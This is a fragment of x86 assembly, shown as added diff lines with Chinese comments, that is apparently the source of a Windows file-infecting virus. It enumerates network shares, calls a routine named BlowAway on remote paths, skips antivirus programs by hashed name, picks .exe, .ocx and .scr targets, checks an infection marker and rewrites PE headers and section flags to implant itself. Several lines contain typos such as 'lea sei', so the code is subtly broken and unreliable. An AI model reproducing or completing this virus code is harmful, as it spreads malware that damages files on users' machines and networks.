+                call WNetOpenEnumA  
+
+                or eax,eax  
+
+                jnz NET_Close   
+
+                push 04  
+
+                push 1000  
+
+                push 4000  
+
+                push 00  
+
+                call VirtualAlloc   
+
+                or eax,eax  
+
+                jz short NET_Close  
+
+                mov EnumBufferAddr,eax   
+
+Net_00:  
+
+                mov esi,EnumBufferAddr   
+
+                lea eax,EnumBufferSize  
+
+                push eax  
+
+                push esi  
+
+                lea eax,EnumNB_Objects  
+
+                push eax  
+
+                push WNetStructAddr  
+
+                call WNetEnumResourceA   
+
+                or eax,eax  
+
+                jnz short NET_Free  
+
+                mov ecx,EnumNB_Objects  
+
+                or ecx,ecx  
+
+                jz short NET_00  
+
+NET_01:  
+
+                push ecx  
+
+                push esi  
+
+                mov esi,[esi+14]   ;计算机名  
+
+                or esi,esi  
+
+                jz short NET_03  
+
+                lea edi,[offset Buffer1 + ebx]  
+
+NET_02:  
+
+                movsb  
+
+                cmp byte ptr [esi],00  
+
+                jnz short NET_02  
+
+                mov al,'\\'  
+
+                stosb  
+
+                push edi  
+
+                call BlowAway   
+
+                push edi  
+
+                call FileSearch  
+
+Net_03:  
+
+                pop esi  
+
+                mov eax,[esi + 0C]  
+
+                and al,2  
+
+                cmp al,2  
+
+                jnz short NET_04   
+
+                push esi  
+
+                call NetSearch   
+
+NEt_04:  
+
+                add esi,20  
+
+                pop ecx  
+
+                loop NET_01  
+
+                jmp short NET_00   
+
+NET_Free:  
+
+               push 8000  
+
+                 push 00  
+
+                 push EnumBufferAddr  
+
+                 call VirtualFree   
+
+NET_Close:  
+
+                 push WNetStructAddr  
+
+                 call WNetCloseEnum  
+
+                 ret   
+
+;************************************************************  ************************************************************  
+
+;  
+
+;**********************************************************************  
+
+FileTest:  
+
+    mov edx,[edi+2C]  
+
+    or edx,20202020  
+
+    xor edx,61F81F61   
+
+    lea esi,[offset skipNames + ebx] ;跳过一些反病毒软件的感染  
+
+    mov ecx,0C   
+
+FT_00:  
+
+    lodsd  
+
+    cmp edx,eax  
+
+    jz short FT_Exit  
+
+    loop FT_00   
+
+;****************************  
+
+;注意
+```
+
+
+
+```asm
+;********************************
+mov esi,edi
+add esi,2C
+
+FT_01:
+lodsb
+or al,al
+jnz short FT_01
+mov eax,[esi -4]    ;扩展名判断
+or eax,20202020
+cmp eax,'xco' ;控件 4
+jz short FT_02
+
+cmp eax,'rcs'   ;屏幕保护文件
+jz short FT_01
+
+cmp eax,'exe' ;标准 exe 文件
+jnz short FT_Exit
+
+FT_02:
+mov eax,[edi+20]  ;文件小于 2000 的就不感染
+cmp eax,2000
+jc short FT_Exit
+
+cmp al,03   ;检测是否已经感染
+jz short FT_Exit
+
+lea esi,[offset Buffer1 + ebx]  ;取文件名和路径
+lea edi,[offset Buffer3 + ebx]
+push edi
+mov ecx,CurrentDirEnd
+sub ecx,esi
+repz movsb
+lea sei,[offset Buffer2 + ebx]
+add esi,2C
+
+FT_03:
+movsb
+cmp byte ptr [esi - 1],0
+jnz short FT_03
+
+call InfectFile
+
+Ft_Exit:
+jmp RS_Next
+
+;********************************
+;感染文件子程序
+;********************************
+InfectFile:
+push i_Filename
+push 03   ;打开文件
+call OpenFile
+
+cmp eax,-1
+jz IN_Exit
+
+mov i_FileHandle,eax
+
+push 00
+push eax
+call GetFileSize   ;去文件的大小，用于以后还原
+
+mov i_FileSize,eax
+
+cmp al,03  ;是否感染
+jz IN_Exit
+
+lea edi,[offset Buffer3 +ebx]
+
+push 00
+lea esi,i_BytesRead
+push esi
+push 2000
+push edi
+push i_FileHandle
+call ReadFile
+
+
+;**************************
+;以下程序与文件头有关
+;**************************
+
+cmp word ptr [edi],5A4Dh    ;dos 文件头
+jnz IN_CloseFile            ;确保是感染的是 PE 文件
+cmp word ptr [edi + 18],0040  ;是否是 windows 文件  ，此处>=40 为 windows 文件，<40H,则是 dos 文件
+
+    jnz IN_CloseFile
+
+    cmp dword ptr [edi + 3C],1C00
+    ja IN_CloseFile
+    cmp dword ptr [edi + 3C] ,1C00  ;dos 文件头的大小
+    ja IN_CloseFile
+
+    add edi [edi + 3C]   ;指向 PE 或者 NE 文件头
+
+    mov eax,[edi]
+    cmp eax,00004550      
+    jnz IN_CloseFile      ;win3.x 的 18H 值也大于等于 40H，可是有用 3.x 的？和病毒出生的年代有关系吧:)
+
+    cmp word ptr [edi+5C],2     ;GUI???
+    jnz IN_CloseFile
+
+    mov esi,edi
+    add esi,18
+    add si,[edi+14]        ;将 esi 指向第一个节表
+    push esi
+
+    mov eax,[edi+28]
+
+IN_00:
+    mov ecx,[esi+0C]
+    add ecx,[esi+08]
+
+    cmp eax,ecx
+    jc short IN_01
+    add esi,28
+    cmp eax,ecx
+    jc short IN_01
+    add esi,28
+    jmp short IN_00
+
+IN_01:
+    sub eax,[esi+0C]
+    add eax,[esi+14]
+    mov i_EP_Offset,eax
+
+    or [esi+24],80000000       ;将它改为可写，这个是 windows 与 dos 在程序和数据段上的一个改变，使我 windows 病毒要注意的地方
+    pop esi
+    xor ecx,ecx
+    mov cx,[edi+06]
+    dec ecx
+    mov eax,ecx
+    mov edx,28
+    mul edx
+    add esi,eax   ;ESI 指向最后一个节表
+
+    mov eax,[esi+24]
+    cmp al,80  ;是否已经初始化
+    jz IN_CloseFile
+    or eax,8C000000
+```
